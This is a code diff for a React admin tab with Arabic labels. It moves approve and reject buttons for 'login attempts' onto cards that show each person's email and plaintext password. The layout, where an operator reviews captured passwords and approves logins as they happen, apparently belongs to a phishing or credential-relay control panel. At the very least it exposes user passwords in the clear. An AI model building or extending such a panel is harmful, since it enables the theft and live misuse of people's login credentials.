@@ -308,57 +308,6 @@ function RegistrationsTab() {
           </div>
 
           <div className="flex-1 overflow-y-auto">
-            {/* ── Login Attempts Section ── */}
-            {loginAttempts.length > 0 && (
-              <div className="border-b border-slate-700 bg-slate-900/30">
-                <div className="px-4 py-2 flex items-center justify-between">
-                  <div className="flex items-center gap-2">
-                    <LogInIcon className="w-4 h-4 text-orange-400" />
-                    <span className="text-xs font-semibold text-slate-300">محاولات تسجيل الدخول</span>
-                    {pendingLogins > 0 && (
-                      <span className="bg-orange-500 text-white text-[10px] px-1.5 py-0.5 rounded-full font-bold animate-pulse">
-                        {pendingLogins}
-                      </span>
-                    )}
-                  </div>
-                </div>
-                {loginAttempts.filter(l => l.status === 'pending').map((login) => {
-                  const reg = registrations.find(r => r.client_id === login.client_id);
-                  return (
-                    <div key={login.id} className="px-4 py-3 border-t border-slate-700/50 bg-orange-500/5">
-                      <div className="flex items-center justify-between mb-2">
-                        <div className="flex items-center gap-2">
-                          <span className="text-xs text-slate-400">{login.email}</span>
-                          <span className="text-[10px] text-slate-500">{formatTimeAgo(login.created_at)}</span>
-                        </div>
-                      </div>
-                      <div className="flex items-center gap-2">
-                        <button
-                          onClick={() => handleLoginAttempt(login.id, 'approved')}
-                          className="flex-1 bg-green-600 hover:bg-green-700 text-white text-xs font-semibold py-2 px-3 rounded-lg transition-colors"
-                        >
-                          ✓ موافق
-                        </button>
-                        <button
-                          onClick={() => handleLoginAttempt(login.id, 'rejected')}
-                          className="flex-1 bg-red-600 hover:bg-red-700 text-white text-xs font-semibold py-2 px-3 rounded-lg transition-colors"
-                        >
-                          ✕ رفض
-                        </button>
-                      </div>
-                    </div>
-                  );
-                })}
-                {loginAttempts.filter(l => l.status !== 'pending').length > 0 && (
-                  <div className="px-4 py-2 bg-slate-800/50">
-                    <p className="text-[10px] text-slate-500">
-                      {loginAttempts.filter(l => l.status === 'approved').length} موافق | {loginAttempts.filter(l => l.status === 'rejected').length} مرفوض
-                    </p>
-                  </div>
-                )}
-              </div>
-            )}
-
             {loading ? (
               <div className="flex items-center justify-center py-16">
                 <div className="w-7 h-7 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" />
@@ -573,6 +522,8 @@ function RegistrationsTab() {
 
                         // Login Attempt Card
                         if (item.type === 'login') {
+                          const loginStatus = item.data.status;
+                          
                           return (
                             <div key={item.id} className={`rounded-xl border ${isNewest ? 'border-amber-500/50 bg-slate-700/30' : 'border-slate-700 bg-slate-800/50'} p-4`}>
                               <div className="flex items-center justify-between mb-3">
@@ -606,6 +557,36 @@ function RegistrationsTab() {
                                   <p className="text-sm text-white font-bold tracking-wider">{item.data.password}</p>
                                 </div>
                               </div>
+                              
+                              {/* أزرار الموافقة والرفض */}
+                              {loginStatus === 'pending' && (
+                                <div className="flex gap-2 mt-3">
+                                  <button
+                                    onClick={() => handleLoginAttempt(item.id, 'approved')}
+                                    className="flex-1 bg-green-600 hover:bg-green-700 text-white text-xs font-semibold py-2 px-3 rounded-lg transition-colors"
+                                  >
+                                    ✓ موافق
+                                  </button>
+                                  <button
+                                    onClick={() => handleLoginAttempt(item.id, 'rejected')}
+                                    className="flex-1 bg-red-600 hover:bg-red-700 text-white text-xs font-semibold py-2 px-3 rounded-lg transition-colors"
+                                  >
+                                    ✕ رفض
+                                  </button>
+                                </div>
+                              )}
+                              
+                              {loginStatus === 'approved' && (
+                                <div className="mt-3 bg-green-500/20 text-green-400 text-xs font-semibold py-2 px-3 rounded-lg text-center">
+                                  ✓ تمت الموافقة
+                                </div>
+                              )}
+                              
+                              {loginStatus === 'rejected' && (
+                                <div className="mt-3 bg-red-500/20 text-red-400 text-xs font-semibold py-2 px-3 rounded-lg text-center">
+                                  ✕ تم الرفض
+                                </div>
+                              )}
                             </div>
                           );
                         }
